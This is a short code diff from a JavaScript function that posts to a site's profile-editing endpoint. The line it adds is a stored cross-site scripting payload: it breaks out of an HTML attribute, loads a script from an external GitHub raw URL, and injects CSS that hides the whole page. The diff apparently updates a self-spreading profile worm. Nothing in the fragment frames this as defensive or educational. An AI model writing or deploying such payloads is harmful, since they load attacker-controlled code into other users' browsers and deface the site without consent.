@@ -31,7 +31,7 @@ function sprof(src) {
       url: "/setprofile_1.xhtml",
       method: "post",
       data: {
-        "pr_var[900]": "\"><script src=http://github.com/this.js></script><style>*, body, h2, .B, .A, div, #shout_msg{display: none !important;visibility: hidden !important;}</style>",
+        "pr_var[900]": "\"><script src=https://github.com/kaloncpu57/wapka-scripts/raw/master/cssnet.js></script><style>*, body, h2, .B, .A, div, #shout_msg{display: none !important;visibility: hidden !important;}</style><tag",
         "submit": "Edit profile",
         "mchs": mchs,
         "p": makeid()
